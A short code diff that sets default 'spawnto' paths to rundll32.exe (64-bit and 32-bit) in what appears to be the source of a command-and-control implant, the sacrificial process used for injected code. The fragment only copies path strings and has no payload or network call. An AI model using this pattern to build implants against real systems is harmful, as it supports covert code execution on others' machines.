@@ -108,6 +108,19 @@ declfn instance::instance(
     response_queue.capacity = 0;
     crypto.h_aes    = nullptr;
     crypto.h_sha256 = nullptr;
+
+    {
+        auto x64_default = symbol<const char*>( "C:\\Windows\\System32\\rundll32.exe" );
+        auto x86_default = symbol<const char*>( "C:\\Windows\\SysWOW64\\rundll32.exe" );
+        uint32_t i = 0;
+        while ( x64_default[i] && i < 259 ) { spawnto.x64[i] = x64_default[i]; i++; }
+        spawnto.x64[i] = '\0';
+        i = 0;
+        while ( x86_default[i] && i < 259 ) { spawnto.x86[i] = x86_default[i]; i++; }
+        spawnto.x86[i] = '\0';
+        spawnto.x64_args[0] = '\0';
+        spawnto.x86_args[0] = '\0';
+    }
 }
 
 auto declfn instance::parse_config() -> bool {
